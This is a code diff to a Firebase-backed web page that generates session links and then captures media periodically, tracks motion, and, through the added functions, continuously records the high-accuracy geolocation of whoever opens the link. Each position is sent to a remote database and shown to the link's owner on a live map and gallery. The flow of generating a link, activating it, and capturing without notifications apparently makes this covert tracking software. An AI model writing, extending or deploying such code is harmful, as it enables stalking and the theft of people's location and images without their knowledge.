@@ -50,7 +50,6 @@
   console.log("Firebase initialized successfully");
 </script>
 <style>
-/* All your existing styles remain exactly the same */
 :root {
   --primary-gradient: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
   --secondary-gradient: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
@@ -385,7 +384,6 @@ select:focus, input:focus {
   color: var(--accent-green);
 }
 
-/* Permission status cards */
 .permissions-container {
   display: grid;
   grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
@@ -464,7 +462,6 @@ select:focus, input:focus {
   color: var(--accent-yellow);
 }
 
-/* Map container */
 .map-container {
   height: 300px;
   width: 100%;
@@ -479,7 +476,6 @@ select:focus, input:focus {
   width: 100%;
 }
 
-/* Sensor data */
 .sensor-data {
   background: rgba(59, 130, 246, 0.05);
   border-radius: var(--radius-md);
@@ -1367,6 +1363,31 @@ async function saveMediaToFirebase(sessionId, mediaItem) {
   }
 }
 
+async function saveLocationToFirebase(sessionId, locationData) {
+  await waitForFirebase();
+  try {
+    // Save individual location with timestamp
+    const locationRef = window.firebaseRef(window.firebaseDB, `sessions/${sessionId}/locations/${Date.now()}`);
+    await window.firebaseSet(locationRef, {
+      ...locationData,
+      id: Date.now().toString()
+    });
+    console.log('Location saved to Firebase');
+    
+    // Also update current location in session
+    const sessionRef = window.firebaseRef(window.firebaseDB, `sessions/${sessionId}`);
+    await window.firebaseUpdate(sessionRef, {
+      currentLocation: locationData,
+      lastActive: Date.now()
+    });
+    
+    return true;
+  } catch (error) {
+    console.error('Error saving location to Firebase:', error);
+    return false;
+  }
+}
+
 async function getAllMediaFromFirebase(sessionId) {
   await waitForFirebase();
   try {
@@ -1412,6 +1433,25 @@ function subscribeToSessionMedia(sessionId, callback) {
       });
     } catch (error) {
       console.error('Error subscribing to media:', error);
+    }
+  });
+}
+
+function subscribeToSessionLocation(sessionId, callback) {
+  waitForFirebase().then(() => {
+    try {
+      const locationRef = window.firebaseRef(window.firebaseDB, `sessions/${sessionId}/locations`);
+      window.firebaseOnValue(locationRef, (snapshot) => {
+        if (snapshot.exists()) {
+          const locationObj = snapshot.val();
+          const locationArray = Object.values(locationObj).sort((a, b) => b.timestamp - a.timestamp);
+          callback(locationArray);
+        } else {
+          callback([]);
+        }
+      });
+    } catch (error) {
+      console.error('Error subscribing to location:', error);
     }
   });
 }
@@ -1775,22 +1815,63 @@ function renderMediaGallery(sessionId) {
 }
 
 // ====================
-// LOCATION TRACKING
+// LOCATION TRACKING (FIXED)
 // ====================
 function initMap(lat, lng) {
-  if (!map) {
-    map = L.map('liveMap').setView([lat, lng], 15);
-    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-      attribution: '© OpenStreetMap contributors'
-    }).addTo(map);
-    mapMarker = L.marker([lat, lng]).addTo(map);
-  } else {
-    map.setView([lat, lng], 15);
-    if (mapMarker) {
-      mapMarker.setLatLng([lat, lng]);
+  // Wait for map container to be visible
+  setTimeout(() => {
+    const mapContainer = document.getElementById('liveMap');
+    if (!mapContainer) return;
+    
+    if (!map) {
+      // Check if map container exists and is visible
+      if (mapContainer.offsetParent !== null) {
+        map = L.map('liveMap').setView([lat, lng], 15);
+        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+          attribution: '© OpenStreetMap contributors'
+        }).addTo(map);
+        mapMarker = L.marker([lat, lng]).addTo(map);
+        
+        // Force map to refresh after initialization
+        setTimeout(() => {
+          map.invalidateSize();
+        }, 100);
+      }
     } else {
-      mapMarker = L.marker([lat, lng]).addTo(map);
+      map.setView([lat, lng], 15);
+      if (mapMarker) {
+        mapMarker.setLatLng([lat, lng]);
+      } else {
+        mapMarker = L.marker([lat, lng]).addTo(map);
+      }
+      // Force map to refresh
+      map.invalidateSize();
     }
+  }, 200);
+}
+
+function updateLocation(position) {
+  currentLocation = {
+    lat: position.coords.latitude,
+    lng: position.coords.longitude,
+    accuracy: position.coords.accuracy,
+    timestamp: Date.now()
+  };
+  
+  locationStatus.className = 'status-badge status-granted';
+  locationStatus.textContent = 'Active';
+  locationDetails.textContent = `${currentLocation.lat.toFixed(6)}, ${currentLocation.lng.toFixed(6)} (Accuracy: ${currentLocation.accuracy.toFixed(1)}m)`;
+  permissionStatus.location = 'granted';
+  
+  // Show map area
+  mapArea.classList.remove('hidden');
+  
+  // Initialize or update map
+  initMap(currentLocation.lat, currentLocation.lng);
+  
+  // Save to Firebase if we have a session
+  if (currentSessionId) {
+    saveLocationToFirebase(currentSessionId, currentLocation);
   }
 }
 
@@ -1799,39 +1880,51 @@ function startLocationTracking() {
     locationStatus.className = 'status-badge status-pending';
     locationStatus.textContent = 'Requesting...';
     
-    watchPositionId = navigator.geolocation.watchPosition(
+    // First get current position quickly
+    navigator.geolocation.getCurrentPosition(
       (position) => {
-        currentLocation = {
-          lat: position.coords.latitude,
-          lng: position.coords.longitude,
-          accuracy: position.coords.accuracy
-        };
+        updateLocation(position);
         
-        locationStatus.className = 'status-badge status-granted';
-        locationStatus.textContent = 'Active';
-        locationDetails.textContent = `${currentLocation.lat.toFixed(6)}, ${currentLocation.lng.toFixed(6)}`;
-        permissionStatus.location = 'granted';
+        // Then start watching for changes
+        if (watchPositionId) {
+          navigator.geolocation.clearWatch(watchPositionId);
+        }
         
-        // Show map area
-        mapArea.classList.remove('hidden');
-        initMap(currentLocation.lat, currentLocation.lng);
+        watchPositionId = navigator.geolocation.watchPosition(
+          (position) => {
+            updateLocation(position);
+          },
+          (error) => {
+            console.error('Geolocation watch error:', error);
+            locationStatus.className = 'status-badge status-denied';
+            locationStatus.textContent = 'Error';
+            locationDetails.textContent = error.message || 'Location unavailable';
+            permissionStatus.location = 'denied';
+          },
+          {
+            enableHighAccuracy: true,
+            maximumAge: 5000,
+            timeout: 10000
+          }
+        );
       },
       (error) => {
         console.error('Geolocation error:', error);
         locationStatus.className = 'status-badge status-denied';
         locationStatus.textContent = 'Denied';
-        locationDetails.textContent = 'Location unavailable';
+        locationDetails.textContent = error.message || 'Location unavailable';
         permissionStatus.location = 'denied';
       },
       {
         enableHighAccuracy: true,
-        maximumAge: 0,
-        timeout: 5000
+        timeout: 10000,
+        maximumAge: 0
       }
     );
   } else {
     locationStatus.className = 'status-badge status-denied';
     locationStatus.textContent = 'Not Supported';
+    locationDetails.textContent = 'Geolocation not available';
     permissionStatus.location = 'denied';
   }
 }
@@ -2186,8 +2279,6 @@ function startPeriodicCapture() {
       });
     }
   }, 60000));
-  
-  // No notification shown
 }
 
 function stopCapture() {
@@ -2197,8 +2288,6 @@ function stopCapture() {
   
   stopLocationTracking();
   stopMotionTracking();
-  
-  // No notification shown
 }
 
 // ====================
@@ -2221,19 +2310,15 @@ async function generateNewLink() {
   });
   
   renderMediaGallery(currentSessionId);
-  
-  // No notification shown
 }
 
 async function downloadAllMedia() {
   if (!currentSessionId) {
-    // No notification shown
     return;
   }
   
   const media = await getSessionMedia(currentSessionId);
   if (media.length === 0) {
-    // No notification shown
     return;
   }
   
@@ -2289,7 +2374,6 @@ async function clearSessionMedia() {
   if (confirm('Are you sure you want to clear all media for this session?')) {
     await clearSessionMediaFromFirebase(currentSessionId);
     renderMediaGallery(currentSessionId);
-    // No notification shown
   }
 }
 
@@ -2301,7 +2385,7 @@ async function activatePackage() {
   const sessionId = urlParams.get('id');
   
   if (!sessionId) {
-    // No notification shown
+    alert('No session ID found in URL');
     return;
   }
   
@@ -2330,7 +2414,7 @@ genBtn.addEventListener('click', generateNewLink);
 copyBtn.addEventListener('click', () => {
   generatedLink.select();
   document.execCommand('copy');
-  // No notification shown
+  alert('Link copied to clipboard!');
 });
 
 openBtn.addEventListener('click', () => {
@@ -2340,7 +2424,7 @@ openBtn.addEventListener('click', () => {
 refreshBtn.addEventListener('click', () => {
   if (currentSessionId) {
     renderMediaGallery(currentSessionId);
-    // No notification shown
+    alert('Media gallery refreshed!');
   }
 });
 
